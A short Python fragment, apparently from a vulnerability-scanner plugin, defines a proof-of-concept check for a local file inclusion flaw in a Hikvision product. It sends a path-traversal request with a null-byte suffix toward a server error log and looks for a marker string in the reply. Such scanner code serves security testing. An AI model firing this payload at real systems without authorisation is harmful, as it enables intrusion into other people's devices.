...
class HikvisionLFI06(POCTemplate):
    ...
    def verify(self, ip, port=80):
        url = f"http://{ip}:{port}/index.php?controller=../../../../Server/logs/error.log%00.php"
        try:
            r = requests.get(url, headers=self.headers, timeout=self.config.timeout, verify=False)
            if r.status_code == 200 and ('Venus01' in r.text):
...
POCTemplate.register_poc(HikvisionLFI06)
